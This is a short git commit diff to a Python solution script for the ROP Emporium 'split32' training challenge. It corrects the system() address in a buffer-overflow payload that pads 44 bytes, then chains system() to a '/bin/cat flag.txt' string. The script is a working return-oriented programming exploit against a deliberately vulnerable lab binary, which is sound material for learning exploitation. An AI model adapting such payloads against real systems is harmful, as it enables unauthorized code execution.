30033cf22dda35bc050761bcf62b22f9cd412276
Clif Wolfe <clifwolfe1@gmail.com>
2019-03-15 13:37:11 -0400

    old split32 only worked in gdb because of an issue with pwndbg

--- rop_emporium/split32_ex.py
+++ rop_emporium/split32_ex.py
@@ -2,7 +2,7 @@
 import struct
 x=lambda a:struct.pack('<I', a)
 payload = 'D'*44
-payload += x(0xf7dda8f0) # address of system()
+payload += x(0x8048430) # address of system()
 payload += 'BBBB' # junk
 payload += x(0x0804a030) # Address of '/bin/cat flag.txt'
 print payload
